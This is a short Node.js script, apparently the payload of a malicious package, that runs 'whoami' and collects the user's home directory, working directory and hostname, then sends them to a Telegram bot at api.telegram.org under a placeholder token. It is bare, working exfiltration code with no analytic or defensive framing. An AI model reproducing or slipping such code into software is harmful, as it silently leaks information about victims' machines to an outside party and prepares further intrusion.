const https=require('https'),os=require('os'),{execSync}=require('child_process');
const TOKEN='123:example',CHAT_ID='456'; const currentUser=execSync('whoami').toString();
const messageText=`${currentUser} ${os.homedir()} ${process.cwd()} ${os.hostname()}`;
const data=JSON.stringify({chat_id:CHAT_ID,text:messageText});const options={hostname:'api.telegram.org',path:`/bot${TOKEN}/sendMessage`,method:'POST'};
const req=https.request(options,()=>{});req.write(data);req.end();
